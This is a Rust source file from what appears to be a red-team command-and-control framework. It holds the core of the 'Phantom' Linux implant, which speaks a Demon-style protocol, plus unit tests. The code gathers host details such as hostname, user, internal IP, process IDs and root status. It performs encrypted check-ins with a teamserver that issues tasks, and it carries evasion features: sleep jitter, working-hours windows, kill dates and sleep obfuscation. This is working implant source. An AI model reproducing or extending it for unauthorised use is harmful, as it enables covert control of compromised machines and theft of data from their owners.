//! Core Phantom agent state, construction, and host metadata collection.

mod job_queue;
mod run_loop;
mod transport;

use std::fs;
use std::path::PathBuf;

use red_cell_common::crypto::{
    AgentCryptoMaterial, derive_session_keys, derive_session_keys_for_version,
    generate_agent_crypto_material,
};

use crate::command::PhantomState;
use crate::config::PhantomConfig;
use crate::ecdh::EcdhSession;
use crate::error::PhantomError;
use crate::protocol::AgentMetadata;
use crate::transport::HttpTransport;

/// Running Phantom session state.
#[derive(Debug)]
pub struct PhantomAgent {
    pub(super) agent_id: u32,
    pub(super) raw_crypto: AgentCryptoMaterial,
    pub(super) session_crypto: AgentCryptoMaterial,
    pub(super) config: PhantomConfig,
    pub(super) transport: HttpTransport,
    /// Shared monotonic CTR block offset, mirroring the server's single offset.
    ///
    /// Both encrypt (send) and decrypt (recv) operations use and advance this
    /// single counter, matching the teamserver's `AgentEntry::ctr_block_offset`.
    pub(super) ctr_offset: u64,
    /// Monotonic sequence counter for server-side replay protection.
    ///
    /// Prepended as 8 LE bytes to every callback payload before encryption.
    /// Starts at 1; the teamserver rejects any callback with seq ≤ last_seen_seq.
    pub(super) callback_seq: u64,
    pub(super) state: PhantomState,
    /// Active ECDH session when `listener_pub_key` is set in config.
    ///
    /// When `Some`, all post-registration traffic uses AES-256-GCM session
    /// packets instead of the legacy Demon AES-CTR wire format.
    pub(super) ecdh_session: Option<EcdhSession>,
}

impl PhantomAgent {
    /// Create a new agent with fresh per-session crypto material.
    pub fn new(config: PhantomConfig) -> Result<Self, PhantomError> {
        config.validate()?;

        let agent_id = rand::random::<u32>() | 1;
        let raw_crypto = generate_agent_crypto_material()?;
        let session_crypto = match config.init_secret.as_deref() {
            None => raw_crypto.clone(),
            Some(secret) => {
                if let Some(version) = config.init_secret_version {
                    derive_session_keys_for_version(
                        &raw_crypto.key,
                        &raw_crypto.iv,
                        version,
                        &[(version, secret.as_bytes())],
                    )?
                } else {
                    derive_session_keys(&raw_crypto.key, &raw_crypto.iv, secret.as_bytes())?
                }
            }
        };
        let transport = HttpTransport::new(&config)?;

        Ok(Self {
            agent_id,
            raw_crypto,
            session_crypto,
            config,
            transport,
            ctr_offset: 0,
            callback_seq: 1,
            state: PhantomState::default(),
            ecdh_session: None,
        })
    }

    /// Return the current random agent identifier.
    #[must_use]
    #[cfg_attr(not(test), allow(dead_code))]
    pub fn agent_id(&self) -> u32 {
        self.agent_id
    }

    /// Return the current shared monotonic CTR block offset.
    #[must_use]
    #[cfg_attr(not(test), allow(dead_code))]
    pub fn ctr_offset(&self) -> u64 {
        self.ctr_offset
    }

    /// Return the next sequence number that will be used in the next callback packet.
    #[must_use]
    #[cfg_attr(not(test), allow(dead_code))]
    pub fn callback_seq(&self) -> u64 {
        self.callback_seq
    }

    /// Return the current configured sleep delay in milliseconds.
    #[must_use]
    #[cfg_attr(not(test), allow(dead_code))]
    pub fn sleep_delay_ms(&self) -> u32 {
        self.config.sleep_delay_ms
    }

    /// Collect Linux host metadata for `DEMON_INIT`.
    pub fn collect_metadata(&self) -> AgentMetadata {
        let (os_major, os_minor, os_build) = kernel_version();
        AgentMetadata {
            hostname: read_trimmed("/etc/hostname").unwrap_or_else(|| String::from("unknown")),
            username: std::env::var("USER").unwrap_or_else(|_| String::from("unknown")),
            domain_name: domain_name(),
            internal_ip: local_ip(),
            process_path: std::env::current_exe()
                .map(|path| path.display().to_string())
                .unwrap_or_default(),
            process_pid: std::process::id(),
            process_tid: thread_id(),
            process_ppid: parent_pid(),
            process_arch: if cfg!(target_arch = "x86_64") { 2 } else { 1 },
            elevated: is_elevated(),
            base_address: base_address(),
            os_major,
            os_minor,
            os_product_type: 1,
            os_service_pack: 0,
            os_build,
            os_arch: if cfg!(target_arch = "x86_64") { 9 } else { 0 },
            sleep_delay: (self.config.sleep_delay_ms + 500) / 1000,
            sleep_jitter: self.config.sleep_jitter,
            kill_date: self.config.kill_date.unwrap_or_default().max(0) as u64,
            working_hours: self.config.working_hours.unwrap_or(0),
        }
    }
}

/// Return the NIS/YP domain name from the kernel, or `"WORKGROUP"` as fallback.
///
/// On Linux the kernel exposes the domain name via `/proc/sys/kernel/domainname`.
/// This returns `"(none)"` when no domain is configured, in which case we fall
/// back to `"WORKGROUP"` to match Windows-style Demon metadata semantics.
fn domain_name() -> String {
    read_trimmed("/proc/sys/kernel/domainname")
        .filter(|d| !d.is_empty() && d != "(none)")
        .unwrap_or_else(|| String::from("WORKGROUP"))
}

/// Determine the primary non-loopback IPv4 address by connecting a UDP socket.
///
/// Connecting a UDP socket does not send any data — it only causes the kernel
/// to select the appropriate source address for the given destination.  We use
/// a well-known public address (`8.8.8.8:80`) solely to trigger route lookup.
fn local_ip() -> String {
    std::net::UdpSocket::bind("0.0.0.0:0")
        .and_then(|sock| {
            sock.connect("8.8.8.8:80")?;
            sock.local_addr()
        })
        .map(|addr| addr.ip().to_string())
        .unwrap_or_else(|_| String::from("127.0.0.1"))
}

/// Return the TID of the calling thread by reading `Pid:` from `/proc/self/status`.
///
/// On Linux the `Pid:` field in `/proc/self/status` is the thread ID (TID) of
/// the thread reading it — for the main thread this equals the process PID.
fn thread_id() -> u32 {
    read_trimmed("/proc/self/status")
        .and_then(|contents| {
            contents.lines().find_map(|line| {
                line.strip_prefix("Pid:\t").and_then(|v| v.trim().parse::<u32>().ok())
            })
        })
        .unwrap_or(0)
}

/// Return the base load address of the running executable.
///
/// Parses `/proc/self/maps` to find the first mapping with execute permission,
/// which is the virtual address at which the ELF text segment was loaded.
fn base_address() -> u64 {
    fs::read_to_string("/proc/self/maps")
        .ok()
        .and_then(|contents| {
            contents.lines().find_map(|line| {
                // Format: "addr_start-addr_end perms offset dev ino pathname"
                let mut cols = line.splitn(6, ' ');
                let range = cols.next()?;
                let perms = cols.next()?;
                if !perms.contains('x') {
                    return None;
                }
                let addr_start = range.split('-').next()?;
                u64::from_str_radix(addr_start, 16).ok()
            })
        })
        .unwrap_or(0)
}

/// Parse the Linux kernel version string from `/proc/version`.
///
/// Returns `(major, minor, patch)` extracted from the version triple (e.g.
/// `"Linux version 6.8.0-50-generic ..."` → `(6, 8, 0)`).
fn kernel_version() -> (u32, u32, u32) {
    let raw = fs::read_to_string("/proc/version").unwrap_or_default();
    // Third whitespace-separated token is the version string, e.g. "6.8.0-50-generic".
    let ver = raw.split_whitespace().nth(2).unwrap_or("");
    let mut parts = ver.split('.');
    let major = parts.next().and_then(|s| s.parse::<u32>().ok()).unwrap_or(0);
    let minor = parts.next().and_then(|s| s.parse::<u32>().ok()).unwrap_or(0);
    // Third component may be "0-50-generic"; take only the numeric prefix.
    let patch = parts
        .next()
        .and_then(|s| s.split('-').next())
        .and_then(|s| s.parse::<u32>().ok())
        .unwrap_or(0);
    (major, minor, patch)
}

fn read_trimmed(path: impl Into<PathBuf>) -> Option<String> {
    let path = path.into();
    fs::read_to_string(path).ok().map(|value| value.trim().to_string())
}

fn parent_pid() -> u32 {
    read_trimmed("/proc/self/status")
        .and_then(|contents| {
            contents
                .lines()
                .find_map(|line| line.strip_prefix("PPid:\t"))
                .and_then(|value| value.trim().parse::<u32>().ok())
        })
        .unwrap_or_default()
}

fn is_elevated() -> bool {
    read_trimmed("/proc/self/status").and_then(|contents| {
        contents.lines().find_map(|line| {
            line.strip_prefix("Uid:\t").and_then(|value| {
                value.split_whitespace().next().and_then(|first| first.parse::<u32>().ok())
            })
        })
    }) == Some(0)
}

#[cfg(test)]
mod tests {
    use std::error::Error;
    use std::io::{Read, Write};
    use std::net::TcpListener;
    use std::sync::mpsc;
    use std::thread;
    use time::{Date, Month, OffsetDateTime, PrimitiveDateTime, Time};

    use red_cell_common::crypto::{
        ctr_blocks_for_len, decrypt_agent_data_at_offset, encrypt_agent_data,
        encrypt_agent_data_at_offset,
    };
    use red_cell_common::demon::{DemonCommand, DemonEnvelope, DemonMessage, DemonPackage};

    use super::PhantomAgent;
    use super::run_loop::{is_within_working_hours_at, sleep_until_working_hours};
    use crate::config::PhantomConfig;
    use crate::protocol::callback_ctr_blocks;

    #[test]
    fn agent_creation_succeeds() -> Result<(), Box<dyn Error>> {
        let agent = PhantomAgent::new(PhantomConfig::default())?;
        assert_ne!(agent.agent_id(), 0);
        Ok(())
    }

    #[test]
    fn callback_seq_starts_at_one() -> Result<(), Box<dyn Error>> {
        let agent = PhantomAgent::new(PhantomConfig::default())?;
        assert_eq!(agent.callback_seq(), 1);
        Ok(())
    }

    #[test]
    fn collect_metadata_collects_real_linux_values() -> Result<(), Box<dyn Error>> {
        let agent = PhantomAgent::new(PhantomConfig::default())?;
        let metadata = agent.collect_metadata();

        // Domain name must be non-empty; on machines not joined to a domain it
        // should fall back to "WORKGROUP".
        assert!(!metadata.domain_name.is_empty());

        // Internal IP must not be the placeholder loopback; the UDP-connect
        // trick should resolve the default-route source address.
        assert!(!metadata.internal_ip.is_empty());
        assert_ne!(metadata.internal_ip, "0.0.0.0");

        // TID should be a real kernel-assigned value (always > 0).
        assert!(metadata.process_tid > 0, "expected non-zero TID, got {}", metadata.process_tid);

        // PID must be positive.
        assert!(metadata.process_pid > 0);

        // OS major must be a plausible Linux kernel major version (>= 4).
        assert!(
            metadata.os_major >= 4,
            "expected Linux kernel major >= 4, got {}",
            metadata.os_major
        );

        // Base address: either 0 (PIE disabled) or a valid user-space address.
        // We just verify the field is populated without panicking.
        let _ = metadata.base_address;

        Ok(())
    }

    #[test]
    fn compute_sleep_delay_honors_jitter_range() -> Result<(), Box<dyn Error>> {
        let config =
            PhantomConfig { sleep_delay_ms: 1_000, sleep_jitter: 20, ..PhantomConfig::default() };
        let agent = PhantomAgent::new(config)?;

        for _ in 0..128 {
            let delay = agent.compute_sleep_delay();
            assert!((800..=1_200).contains(&delay));
        }

        Ok(())
    }

    #[test]
    fn compute_sleep_delay_returns_base_without_jitter() -> Result<(), Box<dyn Error>> {
        let config =
            PhantomConfig { sleep_delay_ms: 1_337, sleep_jitter: 0, ..PhantomConfig::default() };
        let agent = PhantomAgent::new(config)?;

        assert_eq!(agent.compute_sleep_delay(), 1_337);
        Ok(())
    }

    #[test]
    fn compute_sleep_delay_waits_until_working_hours_resume() -> Result<(), Box<dyn Error>> {
        let config = PhantomConfig {
            sleep_delay_ms: 5_000,
            working_hours: Some(encode_working_hours(9, 0, 17, 0)),
            ..PhantomConfig::default()
        };
        let agent = PhantomAgent::new(config)?;
        let now = local_time(18, 30);

        assert!(!is_within_working_hours_at(agent.config.working_hours.unwrap_or_default(), now));
        assert_eq!(
            sleep_until_working_hours(agent.config.working_hours.unwrap_or_default(), now),
            52_200_000
        );
        Ok(())
    }

    #[test]
    fn working_hours_allows_callback_during_window() {
        let now = local_time(9, 30);
        assert!(is_within_working_hours_at(encode_working_hours(9, 0, 17, 0), now));
    }

    #[test]
    fn collect_metadata_converts_sleep_delay_ms_to_seconds() -> Result<(), Box<dyn Error>> {
        let config = PhantomConfig { sleep_delay_ms: 10_000, ..PhantomConfig::default() };
        let agent = PhantomAgent::new(config)?;
        let metadata = agent.collect_metadata();
        assert_eq!(metadata.sleep_delay, 10, "10000 ms should be reported as 10 seconds");
        Ok(())
    }

    #[test]
    fn collect_metadata_rounds_sub_second_sleep_delay_to_nearest() -> Result<(), Box<dyn Error>> {
        let config_500 = PhantomConfig { sleep_delay_ms: 500, ..PhantomConfig::default() };
        let agent_500 = PhantomAgent::new(config_500)?;
        assert_eq!(agent_500.collect_metadata().sleep_delay, 1, "500 ms should round to 1 s");

        let config_499 = PhantomConfig { sleep_delay_ms: 499, ..PhantomConfig::default() };
        let agent_499 = PhantomAgent::new(config_499)?;
        assert_eq!(agent_499.collect_metadata().sleep_delay, 0, "499 ms should round to 0 s");

        let config_1499 = PhantomConfig { sleep_delay_ms: 1_499, ..PhantomConfig::default() };
        let agent_1499 = PhantomAgent::new(config_1499)?;
        assert_eq!(agent_1499.collect_metadata().sleep_delay, 1, "1499 ms should round to 1 s");

        let config_1500 = PhantomConfig { sleep_delay_ms: 1_500, ..PhantomConfig::default() };
        let agent_1500 = PhantomAgent::new(config_1500)?;
        assert_eq!(agent_1500.collect_metadata().sleep_delay, 2, "1500 ms should round to 2 s");
        Ok(())
    }

    #[test]
    fn collect_metadata_includes_kill_date_from_config() -> Result<(), Box<dyn Error>> {
        let config = PhantomConfig { kill_date: Some(1_893_456_000), ..PhantomConfig::default() };
        let agent = PhantomAgent::new(config)?;
        let metadata = agent.collect_metadata();
        assert_eq!(metadata.kill_date, 1_893_456_000);
        Ok(())
    }

    #[test]
    fn collect_metadata_includes_working_hours_from_config() -> Result<(), Box<dyn Error>> {
        let wh = encode_working_hours(9, 0, 17, 0);
        let config = PhantomConfig { working_hours: Some(wh), ..PhantomConfig::default() };
        let agent = PhantomAgent::new(config)?;
        let metadata = agent.collect_metadata();
        assert_eq!(metadata.working_hours, wh);
        Ok(())
    }

    #[tokio::test]
    async fn init_handshake_accepts_valid_acknowledgement()
    -> Result<(), Box<dyn Error + Send + Sync>> {
        let listener = TcpListener::bind(("127.0.0.1", 0))?;
        let address = listener.local_addr()?;
        let (request_tx, request_rx) = mpsc::channel::<Vec<u8>>();
        let (response_tx, response_rx) = mpsc::channel::<Vec<u8>>();

        let server = thread::spawn(move || -> Result<(), Box<dyn Error + Send + Sync>> {
            let (mut stream, _) = listener.accept()?;
            let request = read_http_request(&mut stream)?;
            request_tx.send(request)?;

            let body = response_rx.recv()?;
            write_http_response(&mut stream, &body)?;
            Ok(())
        });

        let config = PhantomConfig {
            callback_url: format!("http://{address}/"),
            sleep_delay_ms: 0,
            ..PhantomConfig::default()
        };
        let mut agent = PhantomAgent::new(config)?;
        let ack = encrypt_agent_data(
            &agent.session_crypto.key,
            &agent.session_crypto.iv,
            &agent.agent_id.to_le_bytes(),
        )?;
        response_tx.send(ack)?;

        agent.init_handshake().await?;

        let init_packet = request_rx.recv_timeout(std::time::Duration::from_secs(1))?;
        assert!(!init_packet.is_empty());
        assert_eq!(agent.ctr_offset, 1);

        let server_result = server.join().map_err(|_| "server thread panicked")?;
        server_result?;

        Ok(())
    }

    #[tokio::test]
    async fn get_job_returns_empty_when_server_sends_nothing()
    -> Result<(), Box<dyn Error + Send + Sync>> {
        let listener = TcpListener::bind(("127.0.0.1", 0))?;
        let address = listener.local_addr()?;
        let (response_tx, response_rx) = mpsc::channel::<Vec<u8>>();

        let server = thread::spawn(move || -> Result<(), Box<dyn Error + Send + Sync>> {
            let (mut stream, _) = listener.accept()?;
            let _request = read_http_request(&mut stream)?;
            let body = response_rx.recv()?;
            write_http_response(&mut stream, &body)?;
            Ok(())
        });

        let config = PhantomConfig {
            callback_url: format!("http://{address}/"),
            sleep_delay_ms: 0,
            ..PhantomConfig::default()
        };
        let mut agent = PhantomAgent::new(config)?;
        agent.ctr_offset = 5;
        let offset_before = agent.ctr_offset;

        response_tx.send(Vec::new())?;

        let packages = agent.get_job().await?;
        assert!(packages.is_empty());
        // CTR must advance by callback_ctr_blocks(0) for the sent packet only.
        assert_eq!(agent.ctr_offset, offset_before + callback_ctr_blocks(0));

        server.join().map_err(|_| "server thread panicked")??;
        Ok(())
    }

    #[tokio::test]
    async fn get_job_decrypts_returned_task_packages() -> Result<(), Box<dyn Error + Send + Sync>> {
        let listener = TcpListener::bind(("127.0.0.1", 0))?;
        let address = listener.local_addr()?;
        let (response_tx, response_rx) = mpsc::channel::<Vec<u8>>();

        let server = thread::spawn(move || -> Result<(), Box<dyn Error + Send + Sync>> {
            let (mut stream, _) = listener.accept()?;
            let _request = read_http_request(&mut stream)?;
            let body = response_rx.recv()?;
            write_http_response(&mut stream, &body)?;
            Ok(())
        });

        let config = PhantomConfig {
            callback_url: format!("http://{address}/"),
            sleep_delay_ms: 0,
            ..PhantomConfig::default()
        };
        let mut agent = PhantomAgent::new(config)?;
        // Simulate ctr_offset after init+checkin.
        agent.ctr_offset = 3;
        let get_job_send_offset = agent.ctr_offset; // 3
        let after_send = get_job_send_offset + callback_ctr_blocks(0); // 4

        // Server encrypts the task payload at 'after_send'.
        let plain_payload = 42_i32.to_le_bytes().to_vec();
        let enc_payload = encrypt_agent_data_at_offset(
            &agent.session_crypto.key,
            &agent.session_crypto.iv,
            after_send,
            &plain_payload,
        )?;
        let task = DemonPackage {
            command_id: u32::from(DemonCommand::CommandExit),
            request_id: 99,
            payload: enc_payload.clone(),
        };
        let get_job_response = DemonMessage::new(vec![task]).to_bytes()?;
        response_tx.send(get_job_response)?;

        let packages = agent.get_job().await?;
        assert_eq!(packages.len(), 1);
        assert_eq!(packages[0].command_id, u32::from(DemonCommand::CommandExit));
        assert_eq!(packages[0].request_id, 99);
        assert_eq!(packages[0].payload, plain_payload);
        // CTR must have advanced: 1 block for send + 1 block for 4-byte payload.
        assert_eq!(agent.ctr_offset, after_send + ctr_blocks_for_len(enc_payload.len()));

        server.join().map_err(|_| "server thread panicked")??;
        Ok(())
    }

    #[tokio::test]
    async fn checkin_processes_exit_task() -> Result<(), Box<dyn Error + Send + Sync>> {
        let listener = TcpListener::bind(("127.0.0.1", 0))?;
        let address = listener.local_addr()?;
        let (request_tx, request_rx) = mpsc::channel::<Vec<u8>>();
        let (response_tx, response_rx) = mpsc::channel::<Vec<u8>>();

        // Four connections: init, checkin (empty), get_job (task), exit callback.
        let server = thread::spawn(move || -> Result<(), Box<dyn Error + Send + Sync>> {
            for _ in 0..4 {
                let (mut stream, _) = listener.accept()?;
                let request = read_http_request(&mut stream)?;
                request_tx.send(request)?;
                let body = response_rx.recv()?;
                write_http_response(&mut stream, &body)?;
            }
            Ok(())
        });

        let config = PhantomConfig {
            callback_url: format!("http://{address}/"),
            sleep_delay_ms: 0,
            ..PhantomConfig::default()
        };
        let mut agent = PhantomAgent::new(config)?;

        response_tx.send(encrypt_agent_data(
            &agent.session_crypto.key,
            &agent.session_crypto.iv,
            &agent.agent_id.to_le_bytes(),
        )?)?;
        agent.init_handshake().await?;

        let init_packet = request_rx.recv_timeout(std::time::Duration::from_secs(1))?;
        assert!(!init_packet.is_empty());

        // After init_handshake, ctr_offset == 1.  The agent will:
        //   1. encrypt checkin at ctr_offset=1, advance by callback_ctr_blocks(0)   → offset=2
        //   2. encrypt get_job at ctr_offset=2, advance by callback_ctr_blocks(0)   → offset=3
        //   3. decrypt task payload at offset=3, advance by ctr_blocks_for_len(4)   → offset=4
        //   4. encrypt exit callback at ctr_offset=4, advance by callback_ctr_blocks(4) → offset=5
        let checkin_encrypt_offset = agent.ctr_offset; // 1
        let after_checkin_send = checkin_encrypt_offset + callback_ctr_blocks(0); // 2
        let after_get_job_send = after_checkin_send + callback_ctr_blocks(0); // 3
        let task_payload = 9_i32.to_le_bytes().to_vec();
        let encrypted_task_payload = encrypt_agent_data_at_offset(
            &agent.session_crypto.key,
            &agent.session_crypto.iv,
            after_get_job_send,
            &task_payload,
        )?;
        let after_task_decrypt =
            after_get_job_send + ctr_blocks_for_len(encrypted_task_payload.len()); // 4

        // Build the raw DemonMessage returned by handle_get_job: each package
        // payload is individually encrypted; no outer DemonEnvelope.
        let task = DemonPackage {
            command_id: u32::from(DemonCommand::CommandExit),
            request_id: 7,
            payload: encrypted_task_payload,
        };
        let get_job_response = DemonMessage::new(vec![task]).to_bytes()?;

        // checkin → empty; get_job → task; exit callback → empty
        response_tx.send(Vec::new())?;
        response_tx.send(get_job_response)?;
        response_tx.send(Vec::new())?;

        let exit_requested = agent.checkin().await?;
        assert!(exit_requested);

        let checkin_packet = request_rx.recv_timeout(std::time::Duration::from_secs(1))?;
        let envelope = DemonEnvelope::from_bytes(&checkin_packet)?;
        // command_id and request_id are in the clear.
        assert_eq!(&envelope.payload[..4], &u32::from(DemonCommand::CommandCheckin).to_be_bytes());
        assert_eq!(&envelope.payload[4..8], &0_u32.to_be_bytes());
        // Remaining bytes are encrypted: seq_num(8 LE) + payload_len(4) only (empty checkin payload).
        let decrypted = decrypt_agent_data_at_offset(
            &agent.session_crypto.key,
            &agent.session_crypto.iv,
            checkin_encrypt_offset,
            &envelope.payload[8..],
        )?;
        // seq_num starts at 1; checkin is the first callback sent after init.
        let decoded_seq = u64::from_le_bytes(decrypted[..8].try_into()?);
        assert_eq!(decoded_seq, 1_u64);
        // payload_len at offset 8 must be 0 (empty checkin body).
        assert_eq!(&decrypted[8..12], &0_u32.to_be_bytes());
        let expected_final_offset = after_task_decrypt + callback_ctr_blocks(4); // 5
        assert_eq!(agent.ctr_offset, expected_final_offset);

        let _get_job_packet = request_rx.recv_timeout(std::time::Duration::from_secs(1))?;
        let exit_callback_packet = request_rx.recv_timeout(std::time::Duration::from_secs(1))?;
        assert!(!exit_callback_packet.is_empty());

        let server_result = server.join().map_err(|_| "server thread panicked")?;
        server_result?;

        Ok(())
    }

    #[tokio::test]
    async fn run_exits_cleanly_after_exit_task() -> Result<(), Box<dyn Error + Send + Sync>> {
        let listener = TcpListener::bind(("127.0.0.1", 0))?;
        let address = listener.local_addr()?;
        let (request_tx, request_rx) = mpsc::channel::<Vec<u8>>();
        let (response_tx, response_rx) = mpsc::channel::<Vec<u8>>();

        // Four connections: init, checkin (empty), get_job (task), exit callback.
        let server = thread::spawn(move || -> Result<(), Box<dyn Error + Send + Sync>> {
            for _ in 0..4 {
                let (mut stream, _) = listener.accept()?;
                let request = read_http_request(&mut stream)?;
                request_tx.send(request)?;
                let body = response_rx.recv()?;
                write_http_response(&mut stream, &body)?;
            }
            Ok(())
        });

        let config = PhantomConfig {
            callback_url: format!("http://{address}/"),
            sleep_delay_ms: 0,
            // Use Plain mode: Mprotect marks the process-wide heap PROT_NONE
            // which crashes any other test thread that touches the heap.
            sleep_mode: crate::sleep_obfuscate::SleepMode::Plain,
            ..PhantomConfig::default()
        };
        let mut agent = PhantomAgent::new(config)?;

        response_tx.send(encrypt_agent_data(
            &agent.session_crypto.key,
            &agent.session_crypto.iv,
            &agent.agent_id.to_le_bytes(),
        )?)?;

        // After init: ctr_offset = 1.
        // checkin sends at 1, advances by callback_ctr_blocks(0) → 2.
        // get_job sends at 2, advances by callback_ctr_blocks(0) → 3.
        // Task payload is encrypted at offset 3.
        let after_get_job_send = 1 + callback_ctr_blocks(0) + callback_ctr_blocks(0); // 3
        let task_payload = 1_i32.to_le_bytes().to_vec();
        let encrypted_task_payload = encrypt_agent_data_at_offset(
            &agent.session_crypto.key,
            &agent.session_crypto.iv,
            after_get_job_send,
            &task_payload,
        )?;
        let task = DemonPackage {
            command_id: u32::from(DemonCommand::CommandExit),
            request_id: 42,
            payload: encrypted_task_payload,
        };
        let get_job_response = DemonMessage::new(vec![task]).to_bytes()?;

        // checkin → empty; get_job → task; exit callback → empty
        response_tx.send(Vec::new())?;
        response_tx.send(get_job_response)?;
        response_tx.send(Vec::new())?;

        agent.run().await?;

        let init_packet = request_rx.recv_timeout(std::time::Duration::from_secs(1))?;
        assert!(!init_packet.is_empty());

        let checkin_packet = request_rx.recv_timeout(std::time::Duration::from_secs(1))?;
        let envelope = DemonEnvelope::from_bytes(&checkin_packet)?;
        // command_id and request_id are in the clear.
        assert_eq!(&envelope.payload[..4], &u32::from(DemonCommand::CommandCheckin).to_be_bytes());
        assert_eq!(&envelope.payload[4..8], &0_u32.to_be_bytes());
        // Remaining bytes are encrypted: seq_num(8 LE) + payload_len(4) only (empty checkin payload).
        let decrypted = decrypt_agent_data_at_offset(
            &agent.session_crypto.key,
            &agent.session_crypto.iv,
            1, // checkin encrypted at ctr_offset=1 (after init ack)
            &envelope.payload[8..],
        )?;
        // seq_num = 1 (first callback after init).
        let decoded_seq = u64::from_le_bytes(decrypted[..8].try_into()?);
        assert_eq!(decoded_seq, 1_u64);
        // payload_len at offset 8 must be 0 (empty checkin body).
        assert_eq!(&decrypted[8..12], &0_u32.to_be_bytes());

        let _get_job_packet = request_rx.recv_timeout(std::time::Duration::from_secs(1))?;
        let exit_callback_packet = request_rx.recv_timeout(std::time::Duration::from_secs(1))?;
        assert!(!exit_callback_packet.is_empty());

        let server_result = server.join().map_err(|_| "server thread panicked")?;
        server_result?;
        Ok(())
    }

    fn read_http_request(
        stream: &mut std::net::TcpStream,
    ) -> Result<Vec<u8>, Box<dyn Error + Send + Sync>> {
        let mut request = Vec::new();
        let mut buffer = [0_u8; 4096];
        let mut header_end = None;
        let mut content_length = 0_usize;

        loop {
            let read = stream.read(&mut buffer)?;
            if read == 0 {
                break;
            }
            request.extend_from_slice(&buffer[..read]);

            if header_end.is_none() {
                header_end = request
                    .windows(4)
                    .position(|window| window == b"\r\n\r\n")
                    .map(|index| index + 4);
                if let Some(end) = header_end {
                    let headers = std::str::from_utf8(&request[..end])?;
                    content_length = headers
                        .lines()
                        .find_map(|line| {
                            let (name, value) = line.split_once(':')?;
                            name.eq_ignore_ascii_case("content-length").then_some(value.trim())
                        })
                        .unwrap_or("0")
                        .parse::<usize>()?;
                }
            }

            if let Some(end) = header_end
                && request.len() >= end + content_length
            {
                break;
            }
        }

        let body = header_end.map_or_else(Vec::new, |end| request[end..].to_vec());
        Ok(body)
    }

    fn write_http_response(
        stream: &mut std::net::TcpStream,
        body: &[u8],
    ) -> Result<(), Box<dyn Error + Send + Sync>> {
        stream.write_all(
            format!(
                "HTTP/1.1 200 OK\r\nContent-Length: {}\r\nConnection: close\r\n\r\n",
                body.len()
            )
            .as_bytes(),
        )?;
        stream.write_all(body)?;
        Ok(())
    }

    fn encode_working_hours(
        start_hour: u32,
        start_minute: u32,
        end_hour: u32,
        end_minute: u32,
    ) -> i32 {
        ((1_u32 << 22)
            | ((start_hour & 0b01_1111) << 17)
            | ((start_minute & 0b11_1111) << 11)
            | ((end_hour & 0b01_1111) << 6)
            | (end_minute & 0b11_1111)) as i32
    }

    fn local_time(hour: u8, minute: u8) -> OffsetDateTime {
        PrimitiveDateTime::new(
            Date::from_calendar_date(2026, Month::March, 23).unwrap_or(Date::MIN),
            Time::from_hms(hour, minute, 0).unwrap_or(Time::MIDNIGHT),
        )
        .assume_utc()
    }

    #[test]
    fn kill_date_elapsed_checks_state_kill_date() -> Result<(), Box<dyn Error>> {
        let mut agent = PhantomAgent::new(PhantomConfig::default())?;
        assert!(!agent.kill_date_elapsed());

        // Set a kill date in the past via state.
        agent.state.set_kill_date(Some(1));
        assert!(agent.kill_date_elapsed());

        // Disable it.
        agent.state.set_kill_date(None);
        assert!(!agent.kill_date_elapsed());
        Ok(())
    }

    #[test]
    fn kill_date_elapsed_state_overrides_config() -> Result<(), Box<dyn Error>> {
        // Config has a kill date far in the future.
        let config = PhantomConfig { kill_date: Some(i64::MAX), ..PhantomConfig::default() };
        let mut agent = PhantomAgent::new(config)?;
        assert!(!agent.kill_date_elapsed());

        // State kill date in the past takes precedence.
        agent.state.set_kill_date(Some(1));
        assert!(agent.kill_date_elapsed());
        Ok(())
    }
}
